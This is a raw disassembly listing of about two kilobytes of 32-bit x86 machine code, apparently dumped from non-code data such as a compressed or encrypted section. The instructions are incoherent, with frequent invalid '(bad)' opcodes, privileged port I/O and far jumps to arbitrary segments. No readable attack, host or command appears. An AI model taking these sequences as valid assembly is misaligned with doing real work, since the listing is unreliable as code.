  4157ae:	push   esi
  4157af:	push   edi
  4157b0:	xor    al,0xf9
  4157b2:	fcmove st,st(0)
  4157b4:	xor    eax,0x42de6b01
  4157b9:	pop    ds
  4157ba:	ja     0x41581a
  4157bc:	popf   
  4157bd:	mov    bh,0x5
  4157bf:	repz pop ebx
  4157c1:	repz inc eax
  4157c3:	popf   
  4157c4:	dec    ebp
  4157c5:	in     eax,dx
  4157c6:	or     cl,al
  4157c8:	enter  0x7bc6,0x27
  4157cc:	(bad)  [eax+0x5d8e4081]
  4157d2:	ret    0x473a
  4157d5:	fadd   st,st(0)
  4157d7:	hlt    
  4157d8:	fs aas 
  4157da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157db:	mov    edi,0x9b4bc8d7
  4157e0:	icebp  
  4157e1:	imul   ebx,esp
  4157e4:	cmp    eax,0x1e0cd2a4
  4157e9:	test   ebp,0x316fe242
  4157ef:	xor    al,0x53
  4157f1:	adc    DWORD PTR [esi],ecx
  4157f3:	xchg   esi,eax
  4157f4:	push   0xceb0282f
  4157f9:	xchg   edx,eax
  4157fa:	clc    
  4157fb:	lea    edx,[ebx+0x3d2173b7]
  415801:	js     0x415818
  415803:	sar    BYTE PTR [eax+0x4be93057],1
  415809:	inc    ecx
  41580a:	pop    es
  41580b:	jg     0x415812
  41580d:	daa    
  41580e:	xchg   edx,eax
  41580f:	in     al,dx
  415810:	pop    edi
  415811:	out    0xc,eax
  415813:	fs fwait
  415815:	xchg   DWORD PTR [esi-0x7031dfc1],esp
  41581b:	loop   0x415866
  41581d:	or     al,BYTE PTR [edi]
  41581f:	xchg   ecx,eax
  415820:	sub    BYTE PTR [edx-0xe],bl
  415823:	mov    ch,0xda
  415825:	mov    ds:0x285bc93d,al
  41582a:	fistp  QWORD PTR [esi-0x23e6204b]
  415830:	arpl   WORD PTR [ebx+0x68],bp
  415833:	lock pop es
  415835:	mov    eax,0x70c6d631
  41583a:	inc    ecx
  41583b:	test   al,0xea
  41583d:	jle    0x41583c
  41583f:	call   0x561a:0x35fd6ee3
  415846:	push   ss
  415847:	mov    ds:0x590cffd1,al
  41584d:	in     eax,0xd7
  41584f:	xor    BYTE PTR [esi+edx*1],0xd8
  415853:	jo     0x4158b2
  415855:	dec    esi
  415856:	int3   
  415857:	lds    eax,FWORD PTR [ebx+edx*1]
  41585a:	pushf  
  41585b:	push   es
  41585c:	lods   al,BYTE PTR ds:[esi]
  41585d:	pop    ebx
  41585e:	jp     0x415848
  415860:	mov    ch,0xcc
  415862:	ja     0x415839
  415864:	mov    eax,esp
  415866:	sbb    eax,0xba253688
  41586b:	push   ds
  41586c:	cmp    al,0x12
  41586e:	ins    BYTE PTR es:[edi],dx
  41586f:	aaa    
  415870:	fs add eax,0x1d85143a
  415876:	call   0x69cd9ffc
  41587b:	cmp    DWORD PTR gs:[esi-0x6a9c779b],ebp
  415882:	jbe    0x415881
  415884:	mov    esp,0x25da2575
  415889:	aam    0xc5
  41588b:	sub    eax,0x15aac114
  415891:	jno    0x415841
  415893:	dec    edx
  415894:	pusha  
  415895:	jbe    0x415881
  415897:	adc    DWORD PTR [ebx],0xffffffaf
  41589a:	push   esp
  41589b:	xor    ebp,esi
  41589d:	daa    
  41589e:	icebp  
  41589f:	(bad)  
  4158a1:	inc    esi
  4158a2:	cmp    bh,BYTE PTR [edx-0x2c5a87aa]
  4158a8:	or     edi,ecx
  4158aa:	out    0x95,eax
  4158ac:	push   eax
  4158ad:	inc    esp
  4158ae:	cmp    ecx,ecx
  4158b0:	(bad)  
  4158b1:	jmp    0xcb85:0xf29116cb
  4158b8:	clc    
  4158b9:	sbb    BYTE PTR [esi],0xa2
  4158bc:	mov    ebx,DWORD PTR [ecx]
  4158be:	cmp    BYTE PTR [ebp-0x22],ch
  4158c1:	test   al,0xec
  4158c3:	mov    esp,esi
  4158c5:	pop    ss
  4158c6:	mov    BYTE PTR [edx+edx*2-0x62],0xc
  4158cb:	mov    ah,bh
  4158cd:	adc    BYTE PTR [eax],0x8c
  4158d0:	jbe    0x4158f8
  4158d2:	cmp    DWORD PTR [edx-0x4b164fe3],esp
  4158d8:	xchg   edx,eax
  4158d9:	pop    eax
  4158da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158db:	ret    0x848e
  4158de:	clc    
  4158df:	jl     0x41594c
  4158e1:	adc    ecx,esp
  4158e3:	loope  0x415935
  4158e5:	jg     0x415926
  4158e7:	or     eax,esi
  4158e9:	pop    ds
  4158ea:	mov    edi,0x8ba8ae36
  4158ef:	ins    BYTE PTR es:[edi],dx
  4158f0:	cwde   
  4158f1:	inc    eax
  4158f2:	ficomp DWORD PTR [ebx-0x17]
  4158f5:	sub    eax,0x75b2f8a7
  4158fa:	out    0x74,al
  4158fc:	jo     0x4158e6
  4158fe:	int3   
  4158ff:	fidiv  DWORD PTR [eax-0x42]
  415902:	mov    ebx,DWORD PTR [edx]
  415904:	aad    0x6e
  415906:	xor    al,0x2
  415908:	jl     0x4158d5
  41590a:	jae    0x415945
  41590c:	sub    esi,edx
  41590e:	pop    ebp
  41590f:	in     eax,0xdc
  415911:	rcr    DWORD PTR [edi],cl
  415913:	push   ecx
  415914:	add    eax,0xa5182aaa
  415919:	das    
  41591a:	adc    al,0x59
  41591c:	and    DWORD PTR [ebx+0x612274af],esp
  415922:	test   eax,0xe3255d10
  415927:	push   ebx
  415928:	pop    edx
  415929:	xchg   ebp,eax
  41592a:	gs in  al,0x6e
  41592d:	push   es
  41592e:	lds    ebx,FWORD PTR [ebp+0x1e]
  415931:	ds stos DWORD PTR es:[edi],eax
  415933:	mov    edi,ss
  415935:	jns    0x41593a
  415937:	mov    bl,BYTE PTR [edx]
  415939:	nop
  41593a:	inc    edx
  41593b:	mov    ebx,0xf5a7555
  415940:	mov    bl,0x43
  415942:	call   0x9552:0x3eb097c1
  415949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41594a:	retf   0x79ef
  41594d:	outs   dx,BYTE PTR ds:[esi]
  41594e:	dec    eax
  41594f:	jbe    0x415938
  415951:	mov    ds:0xe7898e7,al
  415956:	das    
  415957:	arpl   WORD PTR [edx],sp
  415959:	pop    esi
  41595a:	lods   al,BYTE PTR ds:[esi]
  41595b:	sub    BYTE PTR [ebp+0x752b428c],al
  415961:	loopne 0x415993
  415963:	jmp    0xad66a26e
  415968:	lds    edx,FWORD PTR [esi+0x5edc1d84]
  41596e:	iret   
  41596f:	and    DWORD PTR [ebx+edi*4],0x77
  415973:	xlat   BYTE PTR ds:[ebx]
  415974:	in     al,dx
  415975:	fs repz sbb al,0xff
  415979:	retf   
  41597a:	test   eax,0x7f38feda
  41597f:	pop    es
  415980:	mov    edi,0xd5c3cce6
  415985:	fistp  WORD PTR [edx]
  415987:	fisub  WORD PTR [esi]
  415989:	in     al,dx
  41598a:	loopne 0x41593d
  41598c:	xchg   BYTE PTR [ebx-0x29],dh
  41598f:	dec    DWORD PTR [edi]
  415991:	adc    BYTE PTR [esi+ebp*1],dh
  415994:	sbb    al,0x71
  415996:	lods   eax,DWORD PTR ds:[esi]
  415997:	pop    ecx
  415998:	mov    eax,0x9f5997d7
  41599d:	fxch   st(4)
  41599f:	xchg   edx,esp
  4159a1:	push   edi
  4159a2:	push   ecx
  4159a3:	and    eax,0xa4ca5113
  4159a8:	js     0x4159cb
  4159aa:	mov    bl,ch
  4159ac:	push   es
  4159ad:	xchg   bl,dh
  4159af:	sbb    ah,BYTE PTR [esi+0x6a]
  4159b2:	ins    BYTE PTR es:[edi],dx
  4159b3:	int3   
  4159b4:	push   ss
  4159b5:	lahf   
  4159b6:	jmp    0x415a21
  4159b8:	mov    ecx,DWORD PTR [ebp-0x4118d41d]
  4159be:	int    0x96
  4159c0:	cdq    
  4159c1:	jg     0x4159f5
  4159c3:	xor    ah,BYTE PTR ds:0x35210abf
  4159c9:	call   0x3a27:0xdc4ddd85
  4159d0:	xor    BYTE PTR [edi-0xe65c738],bl
  4159d6:	scas   eax,DWORD PTR es:[edi]
  4159d7:	pop    edi
  4159d9:	repz sbb ah,BYTE PTR [edi]
  4159dc:	or     BYTE PTR [ecx+0x5e],bl
  4159df:	cli    
  4159e0:	fnstsw WORD PTR ds:0x933b4cb8
  4159e6:	dec    eax
  4159e7:	pop    es
  4159e8:	sub    bh,al
  4159ea:	mov    al,ds:0xa823285d
  4159ef:	xchg   esp,eax
  4159f0:	jbe    0x415a0b
  4159f2:	pop    esp
  4159f3:	jbe    0x415a05
  4159f5:	lods   al,BYTE PTR ds:[esi]
  4159f6:	into   
  4159f7:	xchg   DWORD PTR [edi+eax*2],edx
  4159fa:	inc    ecx
  4159fb:	and    al,0xc1
  4159fd:	jo     0x4159cb
  4159ff:	pop    ss
  415a00:	scas   al,BYTE PTR es:[edi]
  415a01:	in     al,0x85
  415a03:	mov    esp,ss
  415a05:	jnp    0x4159a0
  415a07:	cmp    BYTE PTR [edx-0x34],cl
  415a0a:	xor    BYTE PTR [edx+0x77],0x8a
  415a0e:	jbe    0x415a05
  415a10:	add    eax,0x15ca3028
  415a15:	jecxz  0x4159b9
  415a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a18:	add    ebp,DWORD PTR [eax]
  415a1a:	mov    fs,WORD PTR [ebx+0x67]
  415a1d:	fisubr WORD PTR [ecx]
  415a1f:	jp     0x4159a2
  415a21:	jl     0x415aa2
  415a23:	pop    ebx
  415a24:	sub    al,0x76
  415a26:	lock bound eax,QWORD PTR [edi-0x56fff7d9]
  415a2d:	inc    esp
  415a2e:	ins    BYTE PTR es:[edi],dx
  415a2f:	xor    ebp,edx
  415a31:	ja     0x415a00
  415a33:	in     eax,0x7e
  415a35:	sub    cl,BYTE PTR [esp+edx*4-0x6a]
  415a39:	(bad)  
  415a3a:	mov    BYTE PTR [ecx-0x7d],0xd3
  415a3e:	and    BYTE PTR [ecx],cl
  415a40:	sub    ah,BYTE PTR [edx-0x71]
  415a43:	or     DWORD PTR [edi],0xfea80699
  415a49:	cld    
  415a4a:	(bad)  
  415a4b:	jge    0x415a70
  415a4d:	fs and eax,0xe80d53b6
  415a53:	jle    0x415a5a
  415a55:	stc    
  415a56:	dec    esi
  415a57:	adc    al,0xe3
  415a59:	out    dx,al
  415a5a:	popf   
  415a5b:	js     0x415a9c
  415a5d:	or     edx,ebp
  415a5f:	xor    al,0x1
  415a61:	outs   dx,BYTE PTR ds:[esi]
  415a62:	stos   DWORD PTR es:[edi],eax
  415a63:	push   esi
  415a64:	out    0xe5,eax
  415a66:	push   esp
  415a67:	push   edi
  415a68:	push   ebx
  415a69:	sahf   
  415a6a:	sub    BYTE PTR [edi+0x40],0x9e
  415a6e:	daa    
  415a6f:	je     0x415a13
  415a71:	jno    0x415ada
  415a73:	out    0xc1,eax
  415a75:	fwait
  415a76:	xor    BYTE PTR [ebx+0x2f],bl
  415a79:	ins    BYTE PTR es:[edi],dx
  415a7a:	sbb    eax,0x2dbf2a2e
  415a7f:	xor    DWORD PTR [esi],eax
  415a81:	into   
  415a82:	les    ecx,FWORD PTR [edx+0x30d93435]
  415a88:	push   es
  415a89:	sbb    al,0xea
  415a8b:	push   0xffffffc4
  415a8d:	scas   eax,DWORD PTR es:[edi]
  415a8e:	xor    edx,DWORD PTR [edi-0x7]
  415a91:	xchg   ecx,eax
  415a92:	(bad)  
  415a93:	cld    
  415a94:	add    dl,BYTE PTR [edx-0x7dd7e4ce]
  415a9a:	mov    DWORD PTR [esi],eax
  415a9c:	dec    edi
  415a9d:	pop    ds
  415a9e:	adc    eax,0xf1bfd7ec
  415aa3:	adc    al,0x29
  415aa5:	(bad)  
  415aa6:	and    dl,BYTE PTR [edx]
  415aa8:	or     BYTE PTR [eax],cl
  415aaa:	mov    eax,0xf7200905
  415aaf:	mov    ds:0x165be88f,al
  415ab4:	add    cl,bh
  415ab6:	test   al,0xf3
  415ab8:	mov    dh,0x81
  415aba:	test   al,0xee
  415abc:	in     al,dx
  415abd:	mov    ah,0x73
  415abf:	xor    ch,bl
  415ac1:	mov    dl,0x79
  415ac3:	push   ebx
  415ac4:	jmp    0x261f6bbd
  415ac9:	sub    ch,ch
  415acb:	inc    esi
  415acc:	cdq    
  415acd:	loopne 0x415b37
  415acf:	adc    eax,0x7aa45c80
  415ad4:	push   ecx
  415ad5:	cmp    DWORD PTR [ebp-0x394b6145],edx
  415adb:	mov    cl,0xf8
  415add:	add    DWORD PTR [ecx-0x56],ecx
  415ae0:	stc    
  415ae1:	xlat   BYTE PTR ds:[ebx]
  415ae2:	or     ecx,DWORD PTR [ebp+0x26dc2551]
  415ae8:	adc    BYTE PTR [edx],cl
  415aea:	mov    WORD PTR [eax+0x1f5889c3],fs
  415af0:	xor    eax,DWORD PTR [ebx+0x4c]
  415af3:	push   edi
  415af4:	push   ds
  415af5:	out    0x76,eax
  415af7:	popf   
  415af8:	mov    edi,0x1c0838ad
  415afd:	dec    edi
  415afe:	mov    dl,0x1
  415b00:	fisttp QWORD PTR [edx]
  415b02:	icebp  
  415b03:	mov    bl,ch
  415b05:	inc    ebx
  415b06:	outs   dx,BYTE PTR ds:[esi]
  415b07:	in     eax,0xf8
  415b09:	neg    DWORD PTR [esi-0x25ee4bf1]
  415b0f:	sti    
  415b10:	pop    ebx
  415b11:	xchg   ebp,eax
  415b12:	add    DWORD PTR [edi+eiz*2],edx
  415b15:	mov    cl,0x1c
  415b17:	jns    0x415aaf
  415b19:	jecxz  0x415b60
  415b1b:	lds    ebp,FWORD PTR [ebx]
  415b1d:	xchg   esi,eax
  415b1e:	mov    ebx,0xefcf1895
  415b23:	xchg   esi,eax
  415b24:	shl    dh,cl
  415b26:	ds jnp 0x415b52
  415b29:	das    
  415b2a:	inc    ecx
  415b2b:	mov    al,ds:0xd4aa1c24
  415b30:	push   es
  415b31:	pushf  
  415b32:	es mov ebp,0x35e1d427
  415b38:	mov    ch,0x76
  415b3a:	jo     0x415baa
  415b3c:	test   al,0x15
  415b3e:	dec    esp
  415b3f:	shl    BYTE PTR [eax],1
  415b41:	xor    DWORD PTR [ebx],ebx
  415b43:	mov    ch,0x25
  415b45:	(bad)  
  415b46:	clc    
  415b47:	scas   al,BYTE PTR es:[edi]
  415b48:	sub    BYTE PTR [ebx],al
  415b4a:	repnz push esi
  415b4c:	pop    ebx
  415b4d:	push   edx
  415b4e:	add    BYTE PTR [edx+edx*2+0xc],ah
  415b52:	mov    eax,0x1d3eb2f3
  415b57:	inc    ebx
  415b58:	ret    
  415b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5a:	out    dx,eax
  415b5b:	push   ds
  415b5c:	imul   ebx,esi,0x9886bb39
  415b62:	jae    0x415bda
  415b64:	rcr    BYTE PTR [edx-0x30],0xfe
  415b68:	pop    edx
  415b69:	out    0xd7,eax
  415b6b:	dec    edx
  415b6c:	shr    ebp,0xd
  415b6f:	in     al,dx
  415b70:	mov    ah,0x2f
  415b72:	call   0x1fd84a50
  415b77:	sti    
  415b78:	int    0x81
  415b7a:	mov    cl,0xb0
  415b7c:	je     0x415bfb
  415b7e:	adc    BYTE PTR [edi-0x7d],dh
  415b81:	lahf   
  415b82:	push   0x22
  415b84:	mov    BYTE PTR [ebx+0x26ea291c],cl
  415b8a:	mov    bh,0x79
  415b8c:	mov    esp,0xc2e493db
  415b91:	test   DWORD PTR [edx+0x7dd76c28],eax
  415b97:	xchg   ecx,eax
  415b98:	mov    eax,DWORD PTR [eax+0x2906f82e]
  415b9e:	mov    dl,0x8a
  415ba0:	cdq    
  415ba1:	cmp    ch,BYTE PTR [edi]
  415ba3:	jb     0x415b76
  415ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ba6:	js     0x415b47
  415ba8:	lods   eax,DWORD PTR fs:[esi]
  415baa:	add    eax,0xcdacf45f
  415baf:	loope  0x415c04
  415bb1:	leave  
  415bb2:	sbb    edi,edi
  415bb4:	cmp    cl,0x50
  415bb7:	sahf   
  415bb8:	add    ebp,0xe2d0aef6
  415bbe:	call   eax
  415bc0:	popa   
  415bc1:	xor    eax,DWORD PTR [esi+0x7609af2d]
  415bc7:	int3   
  415bc8:	push   0x28
  415bca:	nop
  415bcb:	and    ebp,DWORD PTR [ecx]
  415bcd:	pop    eax
  415bce:	sbb    al,0x49
  415bd0:	mov    ?,WORD PTR [esi+0x36]
  415bd3:	int3   
  415bd4:	push   DWORD PTR [eax-0x22]
  415bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd8:	adc    BYTE PTR [esi+0x6c],ah
  415bdb:	mov    eax,0x7eacd869
  415be0:	sti    
  415be1:	imul   ebx,DWORD PTR [ecx+edi*4-0x141ccbaa],0xffffff92
  415be9:	xchg   dh,ch
  415beb:	jae    0x415bc1
  415bed:	pop    eax
  415bee:	loop   0x415b79
  415bf0:	xchg   edi,eax
  415bf1:	cmp    dl,BYTE PTR [esi]
  415bf3:	xor    esp,DWORD PTR [ebx-0x6b]
  415bf6:	stos   DWORD PTR es:[edi],eax
  415bf7:	je     0x415b9c
  415bf9:	je     0x415c1f
  415bfb:	jne    0x415c72
  415bfd:	lds    eax,FWORD PTR [esi+0x4979b34c]
  415c03:	ss js  0x415bac
  415c06:	dec    ebp
  415c07:	push   esp
  415c08:	pop    edi
  415c09:	imul   ecx,DWORD PTR [ebx],0x9fa45855
  415c0f:	add    BYTE PTR [ebx-0x57],bh
  415c12:	xor    esi,esp
  415c14:	cli    
  415c15:	cdq    
  415c16:	mov    eax,es:0x6995608a
  415c1c:	jmp    0x415c00
  415c1e:	pop    edx
  415c1f:	stos   BYTE PTR es:[edi],al
  415c20:	jo     0x415be9
  415c22:	cli    
  415c23:	jle    0x415c47
  415c25:	fcom   QWORD PTR ds:[edx]
  415c28:	leave  
  415c29:	jg     0x415c64
  415c2b:	add    ebp,DWORD PTR [ebp-0x41]
  415c2e:	shl    BYTE PTR [eax+0x9],1
  415c31:	cmp    BYTE PTR [edi+0x6647504c],dh
  415c37:	xor    BYTE PTR [ecx],cl
  415c39:	imul   esp,DWORD PTR [ebp+0x7543fc74],0xfffffff7
  415c40:	ins    BYTE PTR es:[edi],dx
  415c41:	stc    
  415c42:	setge  BYTE PTR ds:0xeb8120f0
  415c49:	dec    edx
  415c4a:	inc    ecx
  415c4b:	retf   
  415c4c:	mov    eax,0x8e52e059
  415c51:	in     eax,dx
  415c52:	add    al,0x35
  415c54:	sbb    al,0x24
  415c56:	jbe    0x415c3a
  415c58:	mov    edi,0xb88398d2
  415c5d:	je     0x415bf1
  415c5f:	or     DWORD PTR [edx+0x7e21cb7a],0xfffffffb
  415c66:	sbb    eax,0xf39398e9
  415c6b:	jge    0x415c9d
  415c6d:	das    
  415c6e:	sbb    edi,DWORD PTR [eax+0x9]
  415c71:	or     edi,DWORD PTR [eax]
  415c73:	icebp  
  415c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c75:	clc    
  415c76:	mov    esi,0x86028c0d
  415c7b:	test   al,0x90
  415c7d:	ss push cs
  415c7f:	push   0x58
  415c81:	sbb    al,bl
  415c83:	out    0xfb,eax
  415c85:	jae    0x415cd6
  415c87:	sub    ecx,ebx
  415c89:	pusha  
  415c8a:	inc    edx
  415c8b:	dec    esp
  415c8c:	mov    bl,0xa9
  415c8e:	cmp    al,0xfd
  415c90:	pop    esp
  415c91:	js     0x415c9d
  415c93:	adc    eax,0x38aa254c
  415c98:	popa   
  415c99:	ret    
  415c9a:	cmp    edx,DWORD PTR [ebp+0x62]
  415c9d:	loope  0x415ce2
  415c9f:	daa    
  415ca0:	ficom  DWORD PTR [edx-0x6b9cd49d]
  415ca6:	jno    0x415ca4
  415ca8:	in     eax,0x85
  415caa:	mov    DWORD PTR [ecx+0x5e],ebp
  415cad:	cmp    dl,BYTE PTR [eax-0x55]
  415cb0:	push   ds
  415cb1:	lahf   
  415cb2:	xor    dh,BYTE PTR [esi]
  415cb4:	test   eax,0x1fa72a73
  415cb9:	call   0xd6f3:0x3b592adb
  415cc0:	pop    ss
  415cc1:	ret    0xc6ec
  415cc4:	(bad)  
  415cc5:	sti    
  415cc6:	xor    DWORD PTR ds:[eax],edx
  415cc9:	pushf  
  415cca:	fst    DWORD PTR [ebx]
  415ccc:	mov    esi,esp
  415cce:	mov    ecx,0x9c857390
  415cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cd4:	adc    DWORD PTR [ebx],esi
  415cd6:	jp     0x415d52
  415cd8:	pop    ebp
  415cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cda:	test   eax,0x4ce90f42
  415cdf:	repnz cmp eax,0x86e8f55f
  415ce5:	call   0x6347:0x62e23aa5
  415cec:	push   esi
  415ced:	nop
  415cee:	inc    esi
  415cef:	(bad)  
  415cf0:	and    ebp,DWORD PTR [ecx+0x216ea995]
  415cf6:	arpl   WORD PTR [esi+0x6b],cx
  415cf9:	ins    BYTE PTR es:[edi],dx
  415cfa:	mov    ch,0xde
  415cfc:	xchg   edx,eax
  415cfd:	cwde   
  415cfe:	cld    
  415cff:	fmul   DWORD PTR [eax-0x3cb80bd6]
  415d05:	ret    
  415d06:	in     al,0x4c
  415d08:	mov    ecx,0x11d63603
  415d0d:	(bad)  
  415d0e:	lds    ebx,FWORD PTR [edx-0x57]
  415d11:	lds    edx,FWORD PTR [edi+0x4]
  415d14:	sub    al,0xf0
  415d16:	mov    al,ds:0x47944a1f
  415d1b:	add    BYTE PTR [ecx+0x104b36d5],bl
  415d21:	push   cs
  415d22:	daa    
  415d23:	sahf   
  415d24:	das    
  415d25:	xchg   edx,eax
  415d26:	mov    bl,0x80
  415d28:	add    eax,0xd5924f3d
  415d2d:	fadd   QWORD PTR [ecx+edx*1-0x43]
  415d31:	ds push 0x800964e
  415d37:	mov    gs,ecx
  415d39:	mov    esp,0x15e34360
  415d3e:	cli    
  415d3f:	xchg   BYTE PTR [ebx],cl
  415d41:	and    eax,0x779b14ca
  415d46:	mov    ebp,0x2f3578bd
  415d4b:	es push ecx
  415d4d:	addr16 pop ebp
  415d4f:	mov    ebp,0xdad62542
  415d54:	pop    DWORD PTR [edx]
  415d56:	leave  
  415d57:	scas   al,BYTE PTR es:[edi]
  415d58:	jb     0x415cf1
  415d5a:	div    DWORD PTR [ebp+ebp*4+0x1c0afef0]
  415d61:	fnsave [ecx+0x4a8cf34a]
  415d67:	ficom  WORD PTR [edi+edx*8]
  415d6a:	ret    
  415d6b:	mov    eax,ds:0xc6858d25
  415d70:	dec    ebp
  415d71:	test   eax,0x54cfd426
  415d76:	cmp    DWORD PTR [edx*8+0x43255891],eax
  415d7d:	int    0x71
  415d7f:	pop    edx
  415d80:	ret    0xe41d
  415d83:	retf   
  415d84:	outs   dx,BYTE PTR ds:[esi]
  415d85:	mov    ds:0x349b8ad3,al
  415d8a:	mov    DWORD PTR [ecx],ebx
  415d8c:	sub    al,0xec
  415d8e:	aam    0xcb
  415d90:	jg     0x415d3e
  415d92:	out    0xbf,al
  415d94:	adc    eax,0x2b8a049f
  415d99:	mov    eax,0x9df543a5
  415d9e:	sbb    eax,0x2ecb9aba
  415da3:	cmp    eax,ebp
  415da5:	xor    eax,0x66a6893e
  415daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dab:	in     eax,0xc5
  415dad:	stc    
  415dae:	mov    gs,ebp
  415db0:	cmp    DWORD PTR [eax],ecx
  415db2:	adc    BYTE PTR [ebp+0x56],dh
  415db5:	mov    ds:0x62da48fb,al
  415dba:	rcr    edx,0xdf
  415dbd:	imul   ecx,DWORD PTR [edi-0x3f],0xffffffb3
  415dc1:	loope  0x415e38
  415dc3:	jmp    0x415e43
  415dc5:	stos   BYTE PTR es:[edi],al
  415dc6:	jp     0x415e35
  415dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dc9:	test   al,0xa5
  415dcb:	sbb    ebx,DWORD PTR [ecx-0x73]
  415dce:	retf   
  415dcf:	bnd jae 0x415dfe
  415dd2:	fidiv  WORD PTR [edx+0x2b]
  415dd5:	cli    
  415dd6:	pushf  
  415dd7:	scas   al,BYTE PTR es:[edi]
  415dd8:	inc    ebp
  415dd9:	add    DWORD PTR [ebx-0x26],0x58d762de
  415de0:	jl     0x415e47
  415de2:	xchg   DWORD PTR [edx],edi
  415de4:	imul   BYTE PTR [esi-0x2f]
  415de7:	add    al,BYTE PTR [ebx-0x29]
  415dea:	adc    ah,BYTE PTR [eax-0x3b0e8493]
  415df0:	push   edx
  415df1:	mov    ah,0xa7
  415df3:	fidivr DWORD PTR [ecx+0x2a]
  415df6:	and    dh,BYTE PTR [ebx-0x36dd3ab7]
  415dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dfd:	adc    BYTE PTR ds:0xd8d84914,bh
  415e03:	dec    ecx
  415e04:	std    
  415e05:	lds    eax,FWORD PTR [edi-0x18bba2f0]
  415e0b:	push   ds
  415e0c:	jge    0x415e12
  415e0e:	pop    ecx
  415e0f:	int3   
  415e10:	cwde   
  415e11:	lahf   
  415e12:	dec    esp
  415e13:	stos   DWORD PTR es:[edi],eax
  415e14:	cdq    
  415e15:	fs push edx
  415e17:	je     0x415e8d
  415e19:	fild   DWORD PTR [ecx+0x65136f47]
  415e1f:	bound  edi,QWORD PTR [ecx]
  415e21:	je     0x415e7f
  415e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e24:	(bad)  
  415e25:	xor    al,0x43
  415e27:	sbb    eax,0xd5b8ab61
  415e2c:	mov    eax,0xc4b36b9
  415e31:	cmp    BYTE PTR [ebp+0x5c],dh
  415e34:	xor    DWORD PTR [esi],eax
  415e36:	in     al,0x2a
  415e38:	imul   esp,DWORD PTR ds:0x2dc809b0,0xffffffdc
  415e3f:	aam    0xee
  415e41:	std    
  415e42:	mov    edi,cs
  415e44:	pop    eax
  415e45:	inc    eax
  415e46:	jmp    0xfd32ec3d
  415e4b:	pop    ss
  415e4c:	push   ss
  415e4d:	ffreep st(3)
  415e4f:	stos   DWORD PTR es:[edi],eax
  415e50:	sbb    ecx,edi
  415e52:	sti    
  415e53:	arpl   WORD PTR [ecx-0x61fcd47],bx
  415e59:	cli    
  415e5a:	adc    ebx,ebx
  415e5c:	les    ebx,FWORD PTR [edx]
  415e5e:	outs   dx,BYTE PTR ds:[esi]
  415e5f:	sbb    al,0xaf
  415e61:	retf   
  415e62:	mov    ecx,0x94d68ff5
  415e67:	(bad)  
  415e68:	cld    
  415e69:	rcl    BYTE PTR [esi+0xc8c60f8],1
  415e6f:	idiv   BYTE PTR [edx]
  415e71:	fstp   TBYTE PTR [eax+esi*2]
  415e74:	dec    ebx
  415e75:	ror    BYTE PTR [edi+0x6cc33f7f],cl
  415e7b:	mov    eax,ds:0x4679470f
  415e80:	fadd   QWORD PTR [edx]
  415e82:	mov    ecx,0x9fe63815
  415e87:	sbb    esp,ecx
  415e89:	add    DWORD PTR [edx-0x75],ecx
  415e8c:	add    al,0x91
  415e8e:	cmp    cl,bl
  415e90:	or     al,0x24
  415e92:	sbb    al,0x58
  415e94:	mov    al,BYTE PTR [ecx+eax*4]
  415e97:	inc    eax
  415e98:	cmp    esi,DWORD PTR [ebx-0x7d]
  415e9b:	loop   0x415eb7
  415e9d:	rcl    DWORD PTR [ebx-0x36309b66],0x42
  415ea4:	out    dx,al
  415ea5:	xor    eax,0x223b8129
  415eaa:	add    ch,BYTE PTR [ebx+eiz*2-0x6]
  415eae:	mov    eax,0x2f51327b
  415eb3:	and    dl,al
  415eb5:	stc    
  415eb6:	cmp    DWORD PTR [eax],0xdfd3cade
  415ebc:	xor    DWORD PTR [eax-0xb],esp
  415ebf:	out    0x7,al
  415ec1:	lods   eax,DWORD PTR ds:[esi]
  415ec2:	ret    
  415ec3:	mov    WORD PTR [eax+0x1fce2321],gs
  415ec9:	sub    DWORD PTR [ecx-0x5f],ebx
  415ecc:	add    al,0x9b
  415ece:	lods   eax,DWORD PTR ds:[esi]
  415ecf:	push   esp
  415ed0:	inc    edx
  415ed1:	jnp    0x415f05
  415ed3:	xchg   edi,eax
  415ed4:	rcr    ch,0xfb
  415ed7:	add    edi,ecx
  415ed9:	mov    edx,0xb9b2401a
  415ede:	test   bh,0xd6
  415ee1:	and    ah,BYTE PTR [edx+0x20]
  415ee4:	out    dx,eax
  415ee5:	lahf   
  415ee6:	loop   0x415ea2
  415ee8:	cmc    
  415ee9:	add    esp,DWORD PTR [ebp-0x3093dec8]
  415eef:	aas    
  415ef0:	ret    0xbdc9
  415ef3:	inc    eax
  415ef4:	inc    edi
  415ef5:	xor    cl,ah
  415ef7:	jecxz  0x415f15
  415ef9:	push   eax
  415efa:	mov    al,0x7
  415efc:	ins    BYTE PTR es:[edi],dx
  415efd:	ins    DWORD PTR es:[edi],dx
  415efe:	mov    al,bl
  415f00:	lock out 0x4c,al
  415f03:	sub    cl,BYTE PTR [ecx]
  415f05:	dec    esp
  415f06:	mov    ebp,DWORD PTR ds:[esi]
  415f09:	inc    ebp
  415f0a:	and    al,0x92
  415f0c:	inc    esp
  415f0d:	mov    ebx,0x98543c91
  415f12:	and    al,0x3f
  415f14:	popf   
  415f15:	or     DWORD PTR [edx+0x19192329],esi
  415f1b:	stos   BYTE PTR es:[edi],al
  415f1c:	je     0x415f28
  415f1e:	sub    ch,BYTE PTR [edx]
  415f20:	dec    edx
  415f21:	fs push edi
  415f23:	jmp    0xd916:0x96cbb14f
  415f2a:	jecxz  0x415f4d
  415f2c:	scas   eax,DWORD PTR es:[edi]
  415f2d:	sub    al,0x19
  415f2f:	iret   
  415f30:	mov    esp,0xaf76a6fd
  415f35:	jbe    0x415ecd
  415f37:	xchg   esp,eax
